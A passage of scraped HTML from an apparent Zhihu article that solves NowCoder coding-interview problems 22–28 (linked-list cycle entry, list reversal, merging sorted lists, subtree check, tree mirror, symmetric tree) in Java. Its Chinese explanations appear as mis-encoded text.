class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">P1</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">k</span><span class=\"o\">--</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"n\">P1</span> <span class=\"o\">=</span> <span class=\"n\">P1</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">k</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">P2</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">P1</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">P1</span> <span class=\"o\">=</span> <span class=\"n\">P1</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">P2</span> <span class=\"o\">=</span> <span class=\"n\">P2</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">P2</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>23. é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4%3FtpId%3D13%26tqId%3D11208%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä¸€ä¸ªé“¾è¡¨ä¸­åŒ…å«ç¯ï¼Œè¯·æ‰¾å‡ºè¯¥é“¾è¡¨çš„ç¯çš„å…¥å£ç»“ç‚¹ã€‚è¦æ±‚ä¸èƒ½ä½¿ç”¨é¢å¤–çš„ç©ºé—´ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆ fast æ¯æ¬¡ç§»åŠ¨ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä¸€ä¸ªæŒ‡é’ˆ slow æ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ã€‚å› ä¸ºå­˜åœ¨ç¯ï¼Œæ‰€ä»¥ä¸¤ä¸ªæŒ‡é’ˆå¿…å®šç›¸é‡åœ¨ç¯ä¸­çš„æŸä¸ªèŠ‚ç‚¹ä¸Šã€‚å‡è®¾ç›¸é‡ç‚¹åœ¨ä¸‹å›¾çš„ z1 ä½ç½®ï¼Œæ­¤æ—¶ fast ç§»åŠ¨çš„èŠ‚ç‚¹æ•°ä¸º x+2y+zï¼Œslow ä¸º x+yï¼Œç”±äº fast é€Ÿåº¦æ¯” slow å¿«ä¸€å€ï¼Œå› æ­¤ x+2y+z=2(x+y)ï¼Œå¾—åˆ° x=zã€‚</p><p>åœ¨ç›¸é‡ç‚¹ï¼Œslow è¦åˆ°ç¯çš„å…¥å£ç‚¹è¿˜éœ€è¦ç§»åŠ¨ z ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœè®© fast é‡æ–°ä»å¤´å¼€å§‹ç§»åŠ¨ï¼Œå¹¶ä¸”é€Ÿåº¦å˜ä¸ºæ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒåˆ°ç¯å…¥å£ç‚¹è¿˜éœ€è¦ç§»åŠ¨ x ä¸ªèŠ‚ç‚¹ã€‚åœ¨ä¸Šé¢å·²ç»æ¨å¯¼å‡º x=zï¼Œå› æ­¤ fast å’Œ slow å°†åœ¨ç¯å…¥å£ç‚¹ç›¸é‡ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-651a721a04171c99d9559c20f7628a0c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"721\" data-rawheight=\"417\" class=\"origin_image zh-lightbox-thumb\" width=\"721\" data-original=\"https://pic1.zhimg.com/v2-651a721a04171c99d9559c20f7628a0c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;721&#39; height=&#39;417&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"721\" data-rawheight=\"417\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"721\" data-original=\"https://pic1.zhimg.com/v2-651a721a04171c99d9559c20f7628a0c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-651a721a04171c99d9559c20f7628a0c_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">EntryNodeOfLoop</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">pHead</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pHead</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">slow</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">,</span> <span class=\"n\">fast</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"k\">do</span> <span class=\"o\">{</span>\n        <span class=\"n\">fast</span> <span class=\"o\">=</span> <span class=\"n\">fast</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">slow</span> <span class=\"o\">=</span> <span class=\"n\">slow</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span> <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">slow</span> <span class=\"o\">!=</span> <span class=\"n\">fast</span><span class=\"o\">);</span>\n    <span class=\"n\">fast</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">slow</span> <span class=\"o\">!=</span> <span class=\"n\">fast</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">slow</span> <span class=\"o\">=</span> <span class=\"n\">slow</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">fast</span> <span class=\"o\">=</span> <span class=\"n\">fast</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">slow</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>24. åè½¬é“¾è¡¨</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/75e878df47f24fdc9dc3e400ec6058ca%3FtpId%3D13%26tqId%3D11168%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>è§£é¢˜æ€è·¯</h2><h3>é€’å½’</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">ReverseList</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">head</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">newHead</span> <span class=\"o\">=</span> <span class=\"n\">ReverseList</span><span class=\"o\">(</span><span class=\"n\">next</span><span class=\"o\">);</span>\n    <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">newHead</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>è¿­ä»£</h3><p>ä½¿ç”¨å¤´æ’æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">ReverseList</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">head</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">newList</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ListNode</span><span class=\"o\">(-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ListNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">newList</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">newList</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n        <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">newList</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>25. åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/d8b6b4358f774294a89de2a6ac4d9337%3FtpId%3D13%26tqId%3D11169%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-9e0f5a4efd2efb72f270a689492735f4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"647\" data-rawheight=\"237\" class=\"origin_image zh-lightbox-thumb\" width=\"647\" data-original=\"https://pic1.zhimg.com/v2-9e0f5a4efd2efb72f270a689492735f4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;647&#39; height=&#39;237&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"647\" data-rawheight=\"237\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"647\" data-original=\"https://pic1.zhimg.com/v2-9e0f5a4efd2efb72f270a689492735f4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-9e0f5a4efd2efb72f270a689492735f4_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><h3>é€’å½’</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">Merge</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">list1</span><span class=\"o\">,</span> <span class=\"n\">ListNode</span> <span class=\"n\">list2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list1</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">list2</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list2</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">list1</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list1</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&lt;=</span> <span class=\"n\">list2</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">list1</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">Merge</span><span class=\"o\">(</span><span class=\"n\">list1</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">,</span> <span class=\"n\">list2</span><span class=\"o\">);</span>\n        <span class=\"k\">return</span> <span class=\"n\">list1</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n        <span class=\"n\">list2</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">Merge</span><span class=\"o\">(</span><span class=\"n\">list1</span><span class=\"o\">,</span> <span class=\"n\">list2</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">);</span>\n        <span class=\"k\">return</span> <span class=\"n\">list2</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h3>è¿­ä»£</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">Merge</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">list1</span><span class=\"o\">,</span> <span class=\"n\">ListNode</span> <span class=\"n\">list2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ListNode</span><span class=\"o\">(-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">list1</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">list2</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list1</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&lt;=</span> <span class=\"n\">list2</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">list1</span><span class=\"o\">;</span>\n            <span class=\"n\">list1</span> <span class=\"o\">=</span> <span class=\"n\">list1</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">list2</span><span class=\"o\">;</span>\n            <span class=\"n\">list2</span> <span class=\"o\">=</span> <span class=\"n\">list2</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list1</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">list1</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list2</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">list2</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>26. æ ‘çš„å­ç»“æ„</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/6e196c44c7004d15b1610b9afca8bd88%3FtpId%3D13%26tqId%3D11170%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-0b02e856024a56c3051c784cce51d0b4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"307\" class=\"origin_image zh-lightbox-thumb\" width=\"648\" data-original=\"https://pic1.zhimg.com/v2-0b02e856024a56c3051c784cce51d0b4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;648&#39; height=&#39;307&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"307\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"648\" data-original=\"https://pic1.zhimg.com/v2-0b02e856024a56c3051c784cce51d0b4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-0b02e856024a56c3051c784cce51d0b4_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">HasSubtree</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root1</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">root2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root1</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">root2</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">isSubtreeWithRoot</span><span class=\"o\">(</span><span class=\"n\">root1</span><span class=\"o\">,</span> <span class=\"n\">root2</span><span class=\"o\">)</span> <span class=\"o\">||</span> <span class=\"n\">HasSubtree</span><span class=\"o\">(</span><span class=\"n\">root1</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">root2</span><span class=\"o\">)</span> <span class=\"o\">||</span> <span class=\"n\">HasSubtree</span><span class=\"o\">(</span><span class=\"n\">root1</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">root2</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">isSubtreeWithRoot</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root1</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">root2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root2</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root1</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root1</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">!=</span> <span class=\"n\">root2</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">isSubtreeWithRoot</span><span class=\"o\">(</span><span class=\"n\">root1</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">root2</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">isSubtreeWithRoot</span><span class=\"o\">(</span><span class=\"n\">root1</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">root2</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>27. äºŒå‰æ ‘çš„é•œåƒ</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/564f4c26aa584921bc75623e48ca3011%3FtpId%3D13%26tqId%3D11171%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"429\" data-rawheight=\"224\" class=\"origin_image zh-lightbox-thumb\" width=\"429\" data-original=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;429&#39; height=&#39;224&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"429\" data-rawheight=\"224\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"429\" data-original=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">Mirror</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"n\">Mirror</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n    <span class=\"n\">Mirror</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">TreeNode</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">;</span>\n    <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">=</span> <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">;</span>\n    <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>28 å¯¹ç§°çš„äºŒå‰æ ‘</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/ff05d44dfdb04e1d83bdbdab320efbcb%3FtpId%3D13%26tqId%3D11211%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"429\" data-rawheight=\"224\" class=\"origin_image zh-lightbox-thumb\" width=\"429\" data-original=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;429&#39; height=&#39;224&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"429\" data-rawheight=\"224\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"429\" data-original=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-1074bc4b63b5a735eb4ef58f057c6853_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">boolean</span> <span class=\"nf\">isSymmetrical</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">pRoot</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pRoot</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">isSymmetrical</span><span class=\"o\">(</span><span class=\"n\">pRoot</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">pRoot</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kt\">boolean</span> <span class=\"nf\">isSymmetrical</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">t1</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">t2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">t1</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">t2</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">t1</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">t2</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">t1</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">!=</span> <span class=\"n\">t2</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">isSymmetrical</span><span class=\"o\">(</span><span class=\"n\">t1</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">t2</span><span class=\"o\">.</span><span 